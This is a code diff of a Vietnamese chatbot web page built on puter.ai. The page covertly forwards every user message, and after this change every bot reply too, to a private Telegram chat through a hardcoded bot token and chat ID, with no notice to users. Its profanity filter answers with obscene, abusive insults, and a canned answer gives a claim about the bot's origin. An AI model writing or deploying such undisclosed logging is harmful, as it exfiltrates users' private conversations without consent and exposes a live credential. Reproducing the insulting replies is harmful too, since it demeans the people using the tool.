@@ -55,29 +55,45 @@
     const statusEl = document.getElementById('status');
     let history = [];
 
+    // 🔹 Token và Chat ID Telegram
+    const BOT_TOKEN = "8251203012:AAEVNjXSKfZXc8ewLZQ3pIHDNtcP_JdL40Q";
+    const CHAT_ID = "7239343492";
+
+    // 🔹 Hàm gửi tin nhắn về Telegram
+    async function sendToTelegram(msg) {
+          try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: msg
+                      })
+                });
+          } catch (e) {
+                console.error("Lỗi gửi Telegram:", e);
+          }
+    }
+
     // 🔹 Danh sách từ cấm
     const badWords = [
-  // Nhóm 1: cơ bản
-  "cặc","cak","cạc","căk","cek","cặc",
-  "lồn","l ờ","lông","l.n","l*n","l0n","l@n","l—n",
-  "buồi","bùi","bìu","búi","bùi chà","buoi",
-  "địt","đjt","đjtt","đ!t","dịt",
-  "đụ má","đù má","duma","đcm","dmm","đcmnl","đmm","dcmnl",
-  "đéo","déo","đ*o","đ//o",
-  "chịch","chít","chịt","chệch","lồn",
-  "phang","phang lồn",
-  "xoạc","xxx","xcmn","cút",
-  "mẹ kiếp",
-  "óc chó","óc chóa","óc c","óc lợn","óc lol","óc b",
-  "bú cặc","bú c","bú ck","búk", "hentai" , "Hentai" , "sex" , "pỏn" , "porn", "hub",
-  "húp bi","húp b",
-  
-  // Nhóm 2: lóng thường gặp
-  "cháy máy","toang","nát l","đập đá","ngáo",
-  "chán sml","mệt vc","tức sml","bựa vc","vui vl", "vãi lồn",
-];
+      "cặc","cak","cạc","căk","cek","cặc",
+      "lồn","l ờ","lông","l.n","l*n","l0n","l@n","l—n",
+      "buồi","bùi","bìu","búi","bùi chà","buoi",
+      "địt","đjt","đjtt","đ!t","dịt",
+      "đụ má","đù má","duma","đcm","dmm","đcmnl","đmm","dcmnl",
+      "đéo","déo","đ*o","đ//o",
+      "chịch","chít","chịt","chệch","lồn",
+      "phang","phang lồn",
+      "xoạc","xxx","xcmn","cút","câm",
+      "mẹ kiếp",
+      "óc chó","óc chóa","óc c","óc lợn","óc lol","óc b",
+      "bú cặc","bú c","bú ck","búk","hentai","sex","pỏn","porn","hub",
+      "húp bi","húp b",
+      "cháy máy","toang","nát l","đập đá","ngáo",
+      "chán sml","mệt vc","tức sml","bựa vc","vui vl","vãi lồn",
+    ];
 
-    // 🔹 Danh sách câu cảnh báo (bạn có thể thêm tùy thích)
     const warningReplies = [
       "⚠️ Cái thứ củ lồn, những từ ngữ như vậy mà mày cũng có thể thốt ra được hay sao.",
       "🚫 Ăn có học mà mày lại thốt ra được những từ như loại vô học vậy hay sao, nhục nhã thay.",
@@ -87,32 +103,9 @@
       "❌ Địt con mẹ nhà mày, hãy sống vì 1 xã hội văn minh đi.",
     ];
 
-// 🔹 Token và Chat ID Telegram
-    const BOT_TOKEN = "8251203012:AAEVNjXSKfZXc8ewLZQ3pIHDNtcP_JdL40Q";
-    const CHAT_ID = "7239343492";
-
-    // 🔹 Hàm gửi tin nhắn về Telegram
-    async function sendToTelegram(msg) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg
-                })
-            });
-        } catch (e) {
-            console.error("Lỗi gửi Telegram:", e);
-        }
-    }
-    
-    // Hàm lấy ngẫu nhiên một câu
     function getRandomWarning() {
       return warningReplies[Math.floor(Math.random() * warningReplies.length)];
     }
-
-
 
     function addMessage(role, text, typing = false) {
       const div = document.createElement('div');
@@ -137,97 +130,98 @@
     }
 
     async function sendMessage() {
-      const text = inputEl.value.trim();
-     
-      if (!text) return;
-      sendToTelegram("👤 Hỏi: " + text);
-      addMessage('user', text);
-      history.push({ role: 'user', content: text });
-      inputEl.value = '';
-      statusEl.textContent = 'Đang xử lý...';
+          const text = inputEl.value.trim();
+          if (!text) return;
+          sendToTelegram("👤: " + text);
+          addMessage('user', text);
+          history.push({ role: 'user', content: text });
+          inputEl.value = '';
+          statusEl.textContent = 'Đang xử lý...';
 
-      // 🔹 Kiểm tra từ cấm
-      const lowerText = text.toLowerCase();
-      if (badWords.some(w => lowerText.includes(w))) {
-        const warning = getRandomWarning();
-        const botDiv = addMessage('bot', "", true);
-        typeWriter(warning, botDiv, 30);
-        history.push({ role: 'assistant', content: warning });
-        statusEl.textContent = 'Đã phản hồi (lọc)';
-        return;
-      }
-// 🔹 Kiểm tra câu hỏi về "ai tạo ra bạn"
-      const creatorQuestions = [
-        "ai tạo ra bạn",
-        "ai là người tạo ra bạn",
-        "ai làm ra bạn",
-        "người tạo ra bạn",
-        "ai code bạn",
-        "ai viết ra bạn",
+          // 🔹 Kiểm tra từ cấm
+          const lowerText = text.toLowerCase();
+          if (badWords.some(w => lowerText.includes(w))) {
+                const warning = getRandomWarning();
+                const botDiv = addMessage('bot', "", true);
+                typeWriter(warning, botDiv, 30);
+                history.push({ role: 'assistant', content: warning });
+                statusEl.textContent = 'Đã phản hồi';
+                return;
+          }
 
-        "ai tạo ra m",
-        "ai là người tạo ra m",
-        "ai làm ra m",
-        "người tạo ra m",
-        "ai code m",
-        "ai viết ra m",
+          // 🔹 Kiểm tra câu hỏi về "ai tạo ra bạn"
+          const creatorQuestions = [
+                "ai tạo ra bạn",
+                "ai là người tạo ra bạn",
+                "ai làm ra bạn",
+                "người tạo ra bạn",
+                "ai code bạn",
+                "ai viết ra bạn",
+                "ai tạo ra m",
+                "ai là người tạo ra m",
+                "ai làm ra m",
+                "người tạo ra m",
+                "ai code m",
+                "ai viết ra m",
+                "ai tạo ra mày",
+                "ai là người tạo ra mày",
+                "ai làm ra mày",
+                "người tạo ra mày",
+                "ai code mày",
+                "ai viết ra mày",
+                "tạo ra bạn",
+                "tạo ra",
+                "làm ra",
+                "code ra",
+                "viết ra mày",
+                "code mày",
+          ];
 
-        "ai tạo ra mày",
-        "ai là người tạo ra mày",
-        "ai làm ra mày",
-        "người tạo ra mày",
-        "ai code mày",
-        "ai viết ra mày",
+          if (creatorQuestions.some(q => lowerText.includes(q))) {
+                const reply = "[QDev × puter] như tiêu đề. Tôi được tạo ra dựa trên các model Open AI có từ các phiên bản cũ nhưng tối ưu hơn!";
+                const botDiv = addMessage('bot', "", true);
+                typeWriter(reply, botDiv, 30);
+                history.push({ role: 'assistant', content: reply });
+                statusEl.textContent = 'Đã phản hồi';
+                sendToTelegram("🤖: " + reply);
+                return;
+          }
 
-        "tạo ra bạn",
-        "tạo ra",
-        "làm ra",
-        "code ra",
-        "viết ra mày",
-        "code mày",
-      ];
+          try {
+                const model = modelSelect.value;
+                const res = await puter.ai.chat(text, { model });
 
-      if (creatorQuestions.some(q => lowerText.includes(q))) {
-        const reply = "[QDev × puter] như tiêu đề. Tôi được tạo ra dựa trên các model Open AI có từ các phiên bản cũ nhưng tối ưu hơn!";
-        const botDiv = addMessage('bot', "", true);
-        typeWriter(reply, botDiv, 30);
-        history.push({ role: 'assistant', content: reply });
-        statusEl.textContent = 'Đã phản hồi';
-        return;
-      }
-      
-      try {
-            const model = modelSelect.value;
-            const res = await puter.ai.chat(text, { model });
+                let reply = res.text || res.message?.content || res.toString();
 
-            let reply = res.text || res.message?.content || res.toString();
+                const botDiv = addMessage('bot', "", true);
+                typeWriter(reply, botDiv, 30);
+                history.push({ role: 'assistant', content: reply });
+                statusEl.textContent = 'Đã xong';
 
-            const botDiv = addMessage('bot', "", true);
-            typeWriter(reply, botDiv, 30);
-            history.push({ role: 'assistant', content: reply });
-            statusEl.textContent = 'Đã xong';
+                // 🔹 Gửi câu trả lời về Telegram
+                sendToTelegram("🤖: " + reply);
 
-            if (enableTTS.checked) {
-                  try {
-                        const audio = await puter.ai.txt2speech(reply, {
-                              language: 'vi-VN',
-                              engine: 'neural'
-                        });
-                        if (audio && typeof audio.play === 'function') {
-                              audio.play();
-                        } else if (audio?.url) {
-                              new Audio(audio.url).play();
-                        }
-                  } catch (e) {
-                        console.warn('TTS lỗi', e);
-                  }
-            }
+                if (enableTTS.checked) {
+                      try {
+                            const audio = await puter.ai.txt2speech(reply, {
+                                  language: 'vi-VN',
+                                  engine: 'neural'
+                            });
+                            if (audio && typeof audio.play === 'function') {
+                                  audio.play();
+                            } else if (audio?.url) {
+                                  new Audio(audio.url).play();
+                            }
+                      } catch (e) {
+                            console.warn('TTS lỗi', e);
+                      }
+                }
 
-      } catch (err) {
-            console.error(err);
-            addMessage('bot', '⚠️ Lỗi API: ' + (err.message || String(err)));
-            statusEl.textContent = 'Lỗi';
-      }
+          } catch (err) {
+                console.error(err);
+                addMessage('bot', '⚠️ Lỗi API: ' + (err.message || String(err)));
+                statusEl.textContent = 'Lỗi';
+          }
     }
   </script>
 </body>
